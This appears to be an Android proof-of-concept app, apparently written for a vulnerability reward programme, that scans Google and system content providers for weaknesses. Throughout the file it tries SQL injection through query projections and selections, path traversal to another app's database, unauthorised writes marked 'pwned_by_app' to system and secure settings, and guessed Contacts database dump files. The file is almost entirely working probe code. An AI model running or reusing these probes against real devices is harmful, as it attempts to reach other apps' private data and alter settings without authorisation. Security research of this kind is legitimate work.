package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.InputStream;

public class ProviderDeepScanActivity extends Activity {
    private static final String TAG = "ProviderDeepScan";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(8);
        logView.setText("Provider Deep Scan\n");
        logView.append("UID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runAllScans).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void testQuery(String desc, String authority, String path) {
        Uri uri = Uri.parse("content://" + authority + (path != null ? "/" + path : ""));
        try {
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                log("[ACCESSIBLE] " + desc + ": " + c.getCount() + " rows");
                if (c.getCount() > 0 && c.moveToFirst()) {
                    String[] cols = c.getColumnNames();
                    StringBuilder sb = new StringBuilder("  Columns: ");
                    for (String col : cols) sb.append(col).append(", ");
                    log(sb.toString());
                }
                c.close();
            } else {
                log("[NULL] " + desc);
            }
        } catch (SecurityException e) {
            log("[BLOCKED] " + desc + ": " + e.getMessage().substring(0, Math.min(e.getMessage().length(), 80)));
        } catch (Exception e) {
            log("[ERROR] " + desc + ": " + e.getClass().getSimpleName() + " " +
                (e.getMessage() != null ? e.getMessage().substring(0, Math.min(e.getMessage().length(), 60)) : "null"));
        }
    }

    private void testOpenFile(String desc, String authority, String path) {
        Uri uri = Uri.parse("content://" + authority + "/" + path);
        try {
            InputStream is = getContentResolver().openInputStream(uri);
            if (is != null) {
                byte[] buf = new byte[256];
                int read = is.read(buf);
                log("[FILE-ACCESSIBLE] " + desc + ": read " + read + " bytes");
                is.close();
            } else {
                log("[FILE-NULL] " + desc);
            }
        } catch (SecurityException e) {
            log("[FILE-BLOCKED] " + desc);
        } catch (java.io.FileNotFoundException e) {
            log("[FILE-NOT-FOUND] " + desc + ": provider accessible but no file");
        } catch (Exception e) {
            log("[FILE-ERR] " + desc + ": " + e.getClass().getSimpleName());
        }
    }

    private void testSqli(String desc, String authority, String path) {
        Uri uri = Uri.parse("content://" + authority + (path != null ? "/" + path : ""));
        try {
            Cursor c = getContentResolver().query(uri,
                new String[]{"_id", "(SELECT sqlite_version()) AS ver"}, null, null, null);
            if (c != null && c.moveToFirst()) {
                int idx = c.getColumnIndex("ver");
                if (idx >= 0) {
                    log("[SQLI-VULN] " + desc + " projection: SQLite " + c.getString(idx));
                }
                c.close();
            }
        } catch (Exception e) {
            // Projection blocked, try selection
            try {
                Cursor c = getContentResolver().query(uri, null,
                    "1=1 AND (SELECT 1)=1", null, null);
                if (c != null) {
                    log("[SQLI-SEL] " + desc + " selection injection: " + c.getCount() + " rows");
                    c.close();
                }
            } catch (Exception e2) {
                // Not injectable
            }
        }
    }

    private void runAllScans() {
        log("=== Google Photos ===");
        String[] photosAuthorities = {
            "com.google.android.apps.photos.contentprovider",
            "com.google.android.apps.photos.contentprovider.impl",
            "com.google.android.apps.photos.sharousel",
            "com.google.android.apps.photos.backup.status",
            "com.google.android.apps.photos.memoriesapi",
            "com.google.android.apps.photos.partnercontentprovider",
            "com.google.android.apps.photos.cloudpicker",
            "com.google.android.apps.photos.mars",
            "com.google.android.apps.photos.mars.lockedmediastore",
            "com.google.android.apps.photos.photoprovider"
        };
        for (String auth : photosAuthorities) {
            testQuery("Photos:" + auth.substring(auth.lastIndexOf('.') + 1), auth, null);
        }

        log("\n=== Google Files ===");
        testQuery("Files:SafeStorage", "com.google.android.apps.nbu.files.provider", "safestorage");
        testQuery("Files:GoogleGuide", "com.google.android.apps.nbu.files.googleguide", null);
        testQuery("Files:FolderSharing", "com.google.android.apps.nbu.files.foldersharing", null);

        log("\n=== AGSA (Google Search) ===");
        testQuery("AGSA:FinanceWidget", "com.google.android.apps.search.widgets.stocks.watchlistui", null);
        testOpenFile("AGSA:FinanceWidgetFile", "com.google.android.apps.search.widgets.stocks.watchlistui", "test.png");
        testOpenFile("AGSA:FinanceWidget_traversal", "com.google.android.apps.search.widgets.stocks.watchlistui", "../databases/icingcorpora.db");
        testQuery("AGSA:SearchSuggest", "com.google.android.googlequicksearchbox.google", "search_suggest_query/test");
        testQuery("AGSA:HubMode", "com.google.android.apps.search.assistant.surfaces.hubmode.firstdock", null);

        log("\n=== Chrome ===");
        testQuery("Chrome:Autofill3P", "com.android.chrome.autofill_third_party_mode", null);
        testSqli("Chrome:Autofill3P", "com.android.chrome.autofill_third_party_mode", null);
        testQuery("Chrome:Browser", "com.android.chrome.browser", "bookmarks");
        testSqli("Chrome:Browser", "com.android.chrome.browser", "bookmarks");

        log("\n=== Messages ===");
        testQuery("Messages:BugleCP", "com.google.android.apps.messaging.shared.datamodel.BugleContentProvider", null);
        testQuery("Messages:MediaScratch", "com.google.android.apps.messaging.shared.datamodel.MediaScratchFileProvider", null);

        log("\n=== Settings Write Escalation ===");
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("name", "test_vuln_from_app");
            cv.put("value", "pwned_by_app");
            Uri result = getContentResolver().insert(
                Uri.parse("content://settings/system"), cv);
            log("[VULN] Settings/system write from app: " + result);
        } catch (Exception e) {
            log("[BLOCKED] Settings/system write: " + e.getMessage());
        }
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("name", "test_vuln_from_app");
            cv.put("value", "pwned_by_app");
            Uri result = getContentResolver().insert(
                Uri.parse("content://settings/secure"), cv);
            log("[VULN] Settings/secure write from app: " + result);
        } catch (Exception e) {
            log("[BLOCKED] Settings/secure write: " + e.getMessage());
        }

        log("\n=== DumpFileProvider (Contacts) ===");
        for (String hex : new String[]{"0", "deadbeef", "a1b2c3"}) {
            testOpenFile("DumpFile:" + hex, "com.android.contacts.dumpfile", hex + "-contacts-db.zip");
        }

        log("\n=== GsaPublicContentProvider (AGSA - NO PERM) ===");
        testQuery("AGSA:PublicCP", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", null);
        testQuery("AGSA:PublicCP/", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "");
        testQuery("AGSA:PublicCP/search", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "search");
        testQuery("AGSA:PublicCP/config", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "config");
        testQuery("AGSA:PublicCP/settings", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "settings");
        testQuery("AGSA:PublicCP/account", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", "account");
        testSqli("AGSA:PublicCP", "com.google.android.googlequicksearchbox.GsaPublicContentProvider", null);

        log("\n=== AGSA Tips Providers (NO PERM) ===");
        testQuery("InterpreterTips", "com.google.android.apps.search.assistant.surfaces.voice.ui.interpreter.tips.configuration.TIPS_CONFIG_PROVIDER", null);
        testQuery("SmartspaceTips", "com.google.android.apps.search.assistant.verticals.ambient.smartspace.tips.configuration.TIPS_CONFIG_PROVIDER", null);

        log("\n=== MediaProvider Photo Picker SQLi ===");
        testSqli("MediaProvider:images", "media", "external/images");
        testSqli("MediaProvider:video", "media", "external/video");
        testSqli("MediaProvider:audio", "media", "external/audio");
        testSqli("MediaProvider:files", "media", "external/file");
        // Test PickerDbFacade path
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://media/picker/0/com.google.android.providers.media.photopicker/media"),
                new String[]{"_id", "(SELECT sqlite_version()) AS ver"}, null, null, null);
            if (c != null && c.moveToFirst()) {
                int idx = c.getColumnIndex("ver");
                if (idx >= 0) {
                    log("[SQLI-VULN] MediaProvider:picker projection: SQLite " + c.getString(idx));
                }
                c.close();
            }
        } catch (Exception e) {
            log("[MediaPicker] " + e.getClass().getSimpleName() + ": " +
                (e.getMessage() != null ? e.getMessage().substring(0, Math.min(e.getMessage().length(), 80)) : "null"));
        }

        log("\n=== SliceProvider Scan ===");
        testQuery("Settings:Slice", "com.android.settings.slices", "action/wifi");
        testQuery("GMS:Slice", "com.google.android.gms.nearby.fastpair.slice", null);

        log("\n=== SCAN COMPLETE ===");
    }
}
